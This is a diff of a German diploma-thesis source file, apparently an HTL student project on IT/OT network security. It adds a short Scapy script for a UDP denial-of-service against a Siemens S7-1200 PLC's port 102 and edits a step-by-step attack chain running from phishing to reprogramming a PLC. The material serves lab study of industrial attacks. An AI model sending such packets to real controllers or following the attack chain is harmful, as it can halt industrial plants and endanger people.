@@ -86,16 +86,36 @@ gabi hier kerberoasting und so machen jaja
 #htl3r.author("David Koch")
 === Physische Manipulation
 
-Bevor die digitale Absicherung des OT-Netzwerks in Betracht zieht, sollte die physische Sicherheit der OT-Umgebung bereits gewährleistet sein. Wenn eine unauthorisierte Person beispielsweise in eine Fabrik einbrechen und dort die Steuerungstechnik manipulieren sollte -- egal ob das durch die Trennung eines Kabels oder der gezielten Umprogrammierung einer SPS durch ihre serielle Schnittstelle passiert -- ist vom schlimmsten auszugehen.
+Bevor man die digitale Absicherung des #htl3r.short[ot]-Netzwerks in Betracht zieht, sollte die physische Sicherheit der #htl3r.short[ot]-Umgebung bereits gewährleistet sein. Wenn eine unauthorisierte Person beispielsweise in eine Fabrik einbrechen und dort die Steuerungstechnik manipulieren sollte -- egal ob das durch die Trennung eines Kabels oder der gezielten Umprogrammierung einer #htl3r.short[sps] durch ihre serielle Schnittstelle passiert -- ist vom schlimmsten auszugehen.
 
-Die Menschheit ist sich schon seit langer Zeit über die Wichtigkeit der physischen Sicherheit bewusst, somit ...
+Die Menschheit ist sich schon seit langer Zeit über die Wichtigkeit der physischen Sicherheit bewusst, somit werden in den meisten industriellen Anlagen bereits Überwachungssysteme wie #htl3r.short[cctv] als auch Perimeterschutz durch Stacheldrahtzäune und Alarmanlagen eingesetzt.
 
-... Überwachungssysteme wie CCTV, Perimeterschutz durch Stacheldrahtzäune und Alarmanlagen ...
+Die Diplomarbeit fokussiert sich jedoch auf die Absicherung der Schnittstelle zwischen #htl3r.short[it]- und #htl3r.short[ot]-Netzwerken, das heißt, dass keine physische Absicherung stattfindet.
+
+#htl3r.author("David Koch")
+=== Netzwerkaufklärung
+
+Bevor ein Angriff stattfinden kann, muss der Angreifer wissen, was es überhaupt im Netzwerk gibt und was für Schwachstellen ausgenutzt werden können. Dieser wichtige Schritt nennt sich Netzwerkaufklärung und kann mit vielen verschiedenen Tools durchgeführt werden. Im Rahmen der in diesem Projekt durchgeführten OT-Angriffe werden Nmap und Metasploit verwendet, wobei Metasploit nicht nur der Netzwerkaufklärung sondern bereits auch dem Penetration-Testing dient.
+
+
 
 #htl3r.author("David Koch")
 === DoS einer SPS <dos-sps>
 
-// https://www.tenable.com/plugins/nessus/131775
+@siemens-sps-dos-cve
+
+#htl3r.code(caption: "Das UDP-Packet für den DoS-Angriff auf die S7-1200", description: none)[
+```python
+from scapy.all import *
+
+target_ip = "10.79.84.1"
+target_port = 102
+payload = b"A" * 1000
+
+udp_packet = IP(dst=target_ip) / UDP(dport=target_port) / payload
+send(udp_packet)
+```
+]
 
 #htl3r.author("David Koch")
 === Manipulation einer SPS
@@ -117,12 +137,12 @@ Da die Entdeckung eines Zero-Day-Exploits in einer Siemens #htl3r.short[sps] ode
 
 Durch die Kombination der oben angeführten möglichen Angriffe lässt sich ein konkretes Angriffsszenario konzipieren, welches in dieser Form auch in einem Echtbetrieb stattfinden könnte:
 
-1. Eine Phishing Mail wird von außen (Internet) an die Buchhaltung geschickt.
-2. Mittels gestohlener Identität eines Buchhaltungsmitarbeiters eine interne Spear-Phishing-Mail an OT-Engineer schicken bzgl. einer Inventurliste z.B. 
-3. Angreifer nutzt die RDP-Berechtigungen des OT-Engineers um tiefer in die Anlage einzudringen.
-4. LotL, Angreifer sammelt über das SCADA-System Infos, wie die Anlage intern ausschaut.
+1. Eine Phishing Mail wird von außen (aus dem Internet) an die Buchhaltung geschickt.
+2. Mittels gestohlener Identität eines Buchhaltungsmitarbeiters wird eine interne Spear-Phishing-Mail an einen OT-Engineer geschickt, zum Beispiel bezüglich einer Inventurliste 
+3. Angreifer nutzt die #htl3r.short[rdp]-Berechtigungen des OT-Engineers um tiefer in die Anlage einzudringen.
+4. LotL, Angreifer sammelt über das #htl3r.short[scada]-System Infos, wie die Anlage intern ausschaut.
 5. Angreifer entdeckt Default Credentials auf OpenPLC.
-6. Steuerung der Zelle 2 wird umprogrammiert.
+6. Steuerung der zweiten Betriebszelle wird umprogrammiert.
 7. Anlage kommt zum Stehen, nachhaltiger Schaden wurde angerichtet.
 
 === Phishing-Mail
@@ -137,4 +157,4 @@ Durch die Kombination der oben angeführten möglichen Angriffe lässt sich ein 
 
 === SPS-Steuerung wird manipuliert
 
-=== Super-GAU tritt ein
+=== GAU tritt ein
